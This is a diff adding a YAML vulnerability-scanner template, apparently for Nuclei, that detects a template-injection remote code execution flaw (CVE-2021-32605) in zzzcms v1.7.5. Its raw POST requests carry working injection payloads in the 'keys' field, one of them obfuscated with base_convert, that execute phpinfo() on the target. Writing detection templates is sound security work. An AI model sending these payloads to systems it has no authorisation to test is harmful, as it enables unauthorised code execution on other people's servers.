@@ -1,0 +1,38 @@
+id: zzzcms-index-location-rce
+info:
+  name: zzzcms v1.7.5 前台远程命令执行漏洞
+  author: leadlife
+  severity: critical
+  description: zzzcms v1.7.5 parserSearch 存在模板注入导致远程命令执行漏洞。
+  reference: 
+    - https://github.com/Threekiii/Awesome-POC/blob/95162cea888c9763e53e277bec553f3747ea0fa2/CMS%E6%BC%8F%E6%B4%9E/zzzcms%20v1.7.5%20%E5%89%8D%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md
+  classification:
+    cve-id: CVE-2021-32605
+  metadata:
+    verified: false
+    fofa-query: demo
+    tips: 老漏洞，资产少，无法验证
+    repair:
+    version: zzzcms v1.7.5
+  tags: zzzcms,rce,ssti
+
+http:
+  - raw:
+      - |
+        POST /?location=search HTTP/1.1
+        Host: {{Hostname}}
+
+        keys={if:=phpinfo()}{end if}
+      
+      - |+
+        POST /?location=search HTTP/1.1
+        Host: {{Hostname}}
+
+        keys={if:array_map(base_convert(27440799224,10,32),array(1))}{end if}
+        
+    matchers:
+      - type: dsl
+        dsl:
+          # - status_code == 200
+          - contains_all(body, "phpinfo","PHP Version")
+        condition: and
